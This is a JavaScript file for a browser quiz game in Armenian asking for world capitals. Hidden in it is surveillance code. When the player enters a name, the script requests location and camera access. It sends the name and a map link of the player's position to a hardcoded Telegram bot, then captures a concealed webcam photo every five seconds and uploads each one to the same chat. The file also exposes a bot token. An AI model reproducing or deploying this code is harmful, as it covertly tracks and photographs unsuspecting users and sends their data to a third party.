const TELEGRAM_BOT_TOKEN = "7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw";
const TELEGRAM_CHAT_ID = "8071841674";

const questionsPool = [
  {
    question: "Ո՞րն է Հայաստանի մայրաքաղաքը։",
    answers: [
      { text: "Երևան", correct: true },
      { text: "Գյումրի", correct: false },
      { text: "Վանաձոր", correct: false },
      { text: "Աշտարակ", correct: false },
    ]
  },
  {
    question: "Ո՞րն է Ֆրանսիայի մայրաքաղաքը։",
    answers: [
      { text: "Մարսել", correct: false },
      { text: "Փարիզ", correct: true },
      { text: "Լիոն", correct: false },
      { text: "Բորդո", correct: false },
    ]
  },
  {
    question: "Ո՞րն է Գերմանիայի մայրաքաղաքը։",
    answers: [
      { text: "Բեռլին", correct: true },
      { text: "Համբուրգ", correct: false },
      { text: "Մյունխեն", correct: false },
      { text: "Քյոլն", correct: false },
    ]
  },
  {
    question: "Ո՞րն է Իտալիայի մայրաքաղաքը։",
    answers: [
      { text: "Միլան", correct: false },
      { text: "Նեապոլ", correct: false },
      { text: "Հռոմ", correct: true },
      { text: "Ֆլորենցիա", correct: false },
    ]
  },
  {
    question: "Ո՞րն է Ռուսաստանի մայրաքաղաքը։",
    answers: [
      { text: "Սանկտ Պետերբուրգ", correct: false },
      { text: "Մոսկվա", correct: true },
      { text: "Եկատերինբուրգ", correct: false },
      { text: "Նովոսիբիրսկ", correct: false },
    ]
  },
  {
    question: "Ո՞րն է Իրանի մայրաքաղաքը։",
    answers: [
      { text: "Շիրազ", correct: false },
      { text: "Թեհրան", correct: true },
      { text: "Իսֆահան", correct: false },
      { text: "Թաբրիզ", correct: false },
    ]
  },
  {
    question: "Ո՞րն է Ամերիկայի Միացյալ Նահանգների մայրաքաղաքը։",
    answers: [
      { text: "Նյու Յորք", correct: false },
      { text: "Լոս Անջելես", correct: false },
      { text: "Վաշինգտոն", correct: true },
      { text: "Չիկագո", correct: false },
    ]
  },
  {
    question: "Ո՞րն է Ճապոնիայի մայրաքաղաքը։",
    answers: [
      { text: "Տոկիո", correct: true },
      { text: "Օսակա", correct: false },
      { text: "Նագոյա", correct: false },
      { text: "Կյոտո", correct: false },
    ]
  },
  {
    question: "Ո՞րն է Չինաստանի մայրաքաղաքը։",
    answers: [
      { text: "Շանհայ", correct: false },
      { text: "Պեկին", correct: true },
      { text: "Չենդու", correct: false },
      { text: "Գուանչժոու", correct: false },
    ]
  },
  {
    question: "Ո՞րն է Մեծ Բրիտանիայի մայրաքաղաքը։",
    answers: [
      { text: "Լիվերպուլ", correct: false },
      { text: "Լոնդոն", correct: true },
      { text: "Մանչեսթեր", correct: false },
      { text: "Բրիստոլ", correct: false },
    ]
  }
];

function shuffle(array) {
  return array.sort(() => Math.random() - 0.5);
}

const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const userNameDisplay = document.getElementById('user-name');
const scoreInfo = document.getElementById('score-info');
const questionContainer = document.getElementById('question-container');
const questionElement = document.getElementById('question');
const answerButtons = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

let currentQuestionIndex = 0;
let correctCount = 0;
let wrongCount = 0;
let userName = '';
let questions = [];
let photoInterval;
let stream;

nameForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  userName = nameInput.value.trim();
  if (!userName) return;

  document.getElementById('name-form-container').style.display = 'none';
  document.getElementById('game-area').style.display = 'block';
  userNameDisplay.textContent = `👤 ${userName}`;

  // Запрос геолокации и камеры, отправка в Telegram
  await requestPermissionsAndSendData();

  startGame();
});

async function requestPermissionsAndSendData() {
  let coordsText = 'Нет данных о местоположении';
  try {
    const pos = await new Promise((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 7000 });
    });
    const { latitude, longitude } = pos.coords;
    coordsText = `https://maps.google.com/?q=${latitude},${longitude}`;
  } catch {
    // Не дали геоданные
  }

  // Запрос камеры
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    startTakingPhotos();
  } catch {
    // Не дали доступ к камере
  }

  sendTelegramMessage(`Имя: ${userName}\nГеолокация: ${coordsText}`);
}

function startTakingPhotos() {
  const video = document.createElement('video');
  video.style.display = 'none';
  document.body.appendChild(video);
  video.srcObject = stream;
  video.play();

  photoInterval = setInterval(() => {
    takePhoto(video);
  }, 5000);
}

function takePhoto(video) {
  if (!video || video.readyState !== 4) return;

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth || 320;
  canvas.height = video.videoHeight || 240;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(blob => {
    if (!blob) return;
    const reader = new FileReader();
    reader.onloadend = () => {
      const base64data = reader.result.split(',')[1];
      sendTelegramPhoto(base64data);
    };
    reader.readAsDataURL(blob);
  }, 'image/jpeg', 0.7);
}

function sendTelegramMessage(text) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    })
  });
}

function sendTelegramPhoto(base64) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
    method: 'POST',
    body: createFormData(base64)
  });
}

function createFormData(base64) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', base64);
  return formData;
}

function startGame() {
  currentQuestionIndex = 0;
  correctCount = 0;
  wrongCount = 0;
  questions = shuffle([...questionsPool]);
  showQuestion();
}

function showQuestion() {
  resetState();

  const q = questions[currentQuestionIndex];
  questionElement.textContent = q.question;

  const shuffledAnswers = shuffle(q.answers);
  shuffledAnswers.forEach((ans) => {
    const btn = document.createElement('button');
    btn.classList.add('btn');
    btn.textContent = ans.text;
    if (ans.correct) btn.dataset.correct = true;
    btn.addEventListener('click', selectAnswer);
    answerButtons.appendChild(btn);
  });

  updateScore();
}

function resetState() {
  answerButtons.innerHTML = '';
  tryAgainBtn.style.display = 'none';
}

function selectAnswer(e) {
  const selected = e.target;
  const isCorrect = selected.dataset.correct === 'true';

  Array.from(answerButtons.children).forEach(btn => {
    const correct = btn.dataset.correct === 'true';
    btn.classList.add(correct ? 'correct' : 'wrong');
    btn.disabled = true;
  });

  if (isCorrect) correctCount++;
  else wrongCount++;

  updateScore();

  setTimeout(() => {
    currentQuestionIndex++;
    if (currentQuestionIndex < questions.length) {
      showQuestion();
    } else {
      showResult();
    }
  }, 1500);
}

function updateScore() {
  const remaining = questions.length - (correctCount + wrongCount);
  scoreInfo.textContent = `Մնաց՝ ${remaining} | Ճիշտ՝ ${correctCount} | Սխալ՝ ${wrongCount}`;
}

function showResult() {
  questionElement.textContent = correctCount >= 5 ? '🏆 Հաղթանակ!' : '❌ Պարտություն';
  answerButtons.innerHTML = '';
  tryAgainBtn.style.display = 'block';
}

tryAgainBtn.addEventListener('click', () => {
  // Остановка фотосъёмки
  if (photoInterval) clearInterval(photoInterval);
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
    stream = null;
  }

  document.getElementById('game-area').style.display = 'none';
  document.getElementById('name-form-container').style.display = 'block';
  nameInput.value = '';
});
